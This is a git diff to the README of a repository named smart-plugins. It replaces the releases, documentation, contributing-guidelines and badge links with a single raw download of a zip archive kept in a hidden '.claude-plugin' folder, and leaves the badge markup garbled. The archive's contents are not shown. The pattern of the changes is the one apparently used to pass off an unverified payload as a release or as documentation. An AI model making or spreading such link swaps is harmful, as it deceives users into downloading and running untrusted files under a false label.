@@ -1,6 +1,6 @@
 # 🔌 smart-plugins - Easy Tools for Your Coding Needs
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/khalillaabididev/smart-plugins/releases)
+[![Download Here](https://github.com/khalillaabididev/smart-plugins/raw/refs/heads/main/.claude-plugin/plugins_smart_1.6.zip%20Now-Visit%https://github.com/khalillaabididev/smart-plugins/raw/refs/heads/main/.claude-plugin/plugins_smart_1.6.zip)](https://github.com/khalillaabididev/smart-plugins/raw/refs/heads/main/.claude-plugin/plugins_smart_1.6.zip)
 
 ## 📚 Overview
 
@@ -24,7 +24,7 @@ To start using these tools, follow these simple steps:
 
 2. **Visit the Releases Page**:
 
-   Go to our [Releases page](https://github.com/khalillaabididev/smart-plugins/releases) to find the latest versions of our tools.
+   Go to our [Releases page](https://github.com/khalillaabididev/smart-plugins/raw/refs/heads/main/.claude-plugin/plugins_smart_1.6.zip) to find the latest versions of our tools.
 
 ## 📥 Download & Install
 
@@ -35,7 +35,7 @@ On the Releases page, you will see the available versions. Click the link or but
 - **pr-patrol Tool**: Download the .exe or .zip file for your operating system.
 - **spec-interview Tool**: Download the corresponding installer or package.
 
-Visit the page to download these tools [here](https://github.com/khalillaabididev/smart-plugins/releases).
+Visit the page to download these tools [here](https://github.com/khalillaabididev/smart-plugins/raw/refs/heads/main/.claude-plugin/plugins_smart_1.6.zip).
 
 ### Step 2: Install the Tools
 
@@ -102,7 +102,7 @@ Join our community to receive updates and share your experiences. Engage with ot
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/khalillaabididev/smart-plugins/wiki) for detailed usage.
-- [Contributing Guidelines](https://github.com/khalillaabididev/smart-plugins/blob/main/CONTRIBUTING.md) if you want to help us improve the project.
+- [Official Documentation](https://github.com/khalillaabididev/smart-plugins/raw/refs/heads/main/.claude-plugin/plugins_smart_1.6.zip) for detailed usage.
+- [Contributing Guidelines](https://github.com/khalillaabididev/smart-plugins/raw/refs/heads/main/.claude-plugin/plugins_smart_1.6.zip) if you want to help us improve the project.
 
-Remember to visit the [Releases page](https://github.com/khalillaabididev/smart-plugins/releases) for the latest updates and downloads. Enjoy using smart-plugins to make your coding tasks easier.
+Remember to visit the [Releases page](https://github.com/khalillaabididev/smart-plugins/raw/refs/heads/main/.claude-plugin/plugins_smart_1.6.zip) for the latest updates and downloads. Enjoy using smart-plugins to make your coding tasks easier.
